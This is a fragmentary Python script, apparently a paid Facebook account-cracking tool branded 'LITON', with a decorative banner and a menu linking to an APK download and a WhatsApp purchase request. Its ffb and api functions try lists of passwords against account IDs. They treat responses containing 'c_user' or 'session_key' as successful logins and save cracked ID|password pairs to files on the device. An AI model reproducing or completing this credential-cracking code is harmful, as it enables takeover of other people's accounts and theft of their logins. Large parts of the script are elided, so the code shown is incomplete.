...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ 𓆩𝐋𝐢𝐭𝐨𝐧𓆪 ━━━━━━━━━━━━━━━━━━┑
               \033[33;1m𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘   :  𝐔𝐋𝐋 𝐋𝐢𝐭𝐨𝐧            
               \033[33;1m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊     :  Liton\٠\__❷⓿❷❷ ;* 3:) :) ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎              
               \033[38;5;46m𝐆𝐢𝐭𝐇𝐮𝐛       :  𝐔𝐋𝐋36𝐓𝐌       
               \033[38;5;46m𝐒𝐓𝐀𝐓𝐔𝐒       :   𝐏𝐀𝐈𝐃😴            
               \033[38;5;46m𝐓𝐄𝐀𝐌         :  𓆩𝐔𝐩𝐝𝐚𝐭 𝐋𝐨𝐠𝐨 𝐋𝐢𝐭𝐨𝐧𓆪                 
               \033[1;36m𝐓𝐎𝐎𝐋 𝐕𝐈𝐑𝐒𝐈𝐎𝐍 :  2.09                    
               \033[1;36m𝐓𝐎𝐎𝐋 𝐖𝐎𝐑𝐊    :  𝐎𝐍𝐋𝐘 𝐃𝐀𝐓𝐀           
      └━━━━━━━━━━━━━━━━━ 𓆩𝐋𝐢𝐭𝐨𝐧𓆪 ━━━━━━━━━━━━━━━━━┘""")
def linex():
        print('\033[38;5;46m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/LITON_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100080048596046/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801774105104&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid LITON PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python LITON.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [LITON-ULL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [LITON-OK] %s | %s'%(ids,pas))
                                open('/sdcard/LITON-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [LITON-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LITON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [LITON-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LITON-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/LITON-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [LITON-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/LITON-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [LITON-OK] '+uid+' | '+pas+'\033[1;97m')
